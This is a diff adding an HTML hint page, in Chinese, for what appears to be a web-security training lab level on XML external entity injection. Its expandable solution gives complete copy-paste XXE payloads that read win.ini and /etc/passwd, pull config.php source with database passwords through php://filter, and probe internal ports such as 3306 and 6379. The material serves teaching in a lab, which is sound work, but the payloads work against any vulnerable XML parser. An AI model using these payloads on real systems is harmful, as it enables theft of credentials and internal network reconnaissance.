@@ -1,0 +1,50 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>XXE 的核心是<b>XML 解析器加载了外部实体</b>。思路：在 XML 的 DOCTYPE 里定义一个外部实体，指向服务器本地文件（如 <code>file:///C:/Windows/win.ini</code>），然后在正文里引用这个实体，解析时文件内容就会被"夹带"到回显里。读 PHP 源码要注意 <code>&lt;?php</code> 会破坏 XML 结构，需用 <code>php://filter</code> 先 base64 编码再读。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>目标1 - 读本地文件（完整 payload，全选复制即可）：</b><br>
+Windows 环境，把下面整段粘贴到 XML 报文文本框里提交：
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE user [
+    &lt;!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"&gt;
+]&gt;
+&lt;user&gt;
+    &lt;name&gt;&amp;xxe;&lt;/name&gt;
+    &lt;email&gt;a@a.com&lt;/email&gt;
+&lt;/user&gt;</code></pre>
+Linux 环境换成：
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE user [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;user&gt;
+    &lt;name&gt;&amp;xxe;&lt;/name&gt;
+    &lt;email&gt;a@a.com&lt;/email&gt;
+&lt;/user&gt;</code></pre>
+<b>目标2 - base64 读 config.php 源码（完整 payload，全选复制即可）：</b><br>
+直接 <code>file:///</code> 读 PHP 源码会因 <code>&lt;?php</code> 的 <code>&lt;</code> 破坏 XML 结构导致解析失败，改用 <code>php://filter</code> 先 base64 编码再读：
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE user [
+    &lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource={{BASE_DIR}}/config.php"&gt;
+]&gt;
+&lt;user&gt;
+    &lt;name&gt;&amp;xxe;&lt;/name&gt;
+    &lt;email&gt;a@a.com&lt;/email&gt;
+&lt;/user&gt;</code></pre>
+提交后回显的 base64 字符串拿去解码即得 <code>config.php</code> 完整源码（含数据库口令）。<br>
+<b>目标3 - XXE 探测内网（完整 payload）：</b>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE user [
+    &lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80/"&gt;
+]&gt;
+&lt;user&gt;
+    &lt;name&gt;&amp;xxe;&lt;/name&gt;
+    &lt;email&gt;a@a.com&lt;/email&gt;
+&lt;/user&gt;</code></pre>
+把端口改成 <code>8080</code>、<code>3306</code>、<code>6379</code> 等，对比解析成功/报错差异即可判断内网存活服务。<br>
+<b>抓包点：</b>本关是 POST 提交 XML，可用 Burp Repeater 反复改报文测试。
+</div>
+</details>
